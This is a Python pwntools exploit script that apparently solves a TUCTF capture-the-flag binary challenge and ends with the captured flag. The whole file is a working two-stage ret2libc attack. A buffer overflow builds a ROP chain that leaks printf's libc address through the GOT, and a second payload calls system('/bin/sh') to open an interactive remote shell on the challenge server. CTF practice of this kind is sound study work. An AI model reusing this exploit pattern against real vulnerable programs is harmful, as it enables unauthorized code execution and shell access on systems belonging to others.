from pwn import *
import time


binpath = './thefirst'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = "DEBUG"

elf = ELF(binpath)
# libc = elf.libc
# libc from libc.blukat.me (libc database)
libc = ELF("./libc6_2.27-3ubuntu1_i386.so")


gdbscript = '''
gef
# before return
b *0x8049287
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote("chal.tuctf.com", 30508)
# io = process(binpath)

pop = 0x080492f3


addr_printf_plt = 0x08049090
addr_gets_plt = 0x080490a0


payload = b''
payload += b'A' * 0x18

payload += p32(addr_printf_plt)
payload += p32(pop)
payload += p32(elf.got['printf'])
payload += p32(elf.symbols['main'])

# payload += p32(addr_printf_plt)
# payload += p32(pop)
# payload += p32(elf.got['gets'])

# time.sleep(0.2)

# first main
io.recvuntil(b"Let's see what you can do\n> ")
print("Send payload")
io.sendline(payload)

data = io.recv()
addr_printf = u32(data[:4])
addr_libc = addr_printf - libc.symbols['printf']

# addr_gets = u32(data[4:8])
# print("addr_gets = 0x{:x}".format(addr_gets))
# print(hexdump(data))

print("addr_printf = 0x{:x}".format(addr_printf))
print("addr_libc = 0x{:x}".format(addr_libc))

# second main
# time.sleep(0.2)
# io.recvuntil(b"Let's see what you can do\n> ")
print("Send payload")
payload = b''
payload += b'B' * 0x18
payload += p32(addr_libc + libc.symbols['system'])
payload += p32(0xdeadbeef)
payload += p32(addr_libc + next(libc.search(b'/bin/sh')))
io.sendline(payload)

io.interactive()
# TUCTF{0n3_d0wn..._50_m4ny_70_60}
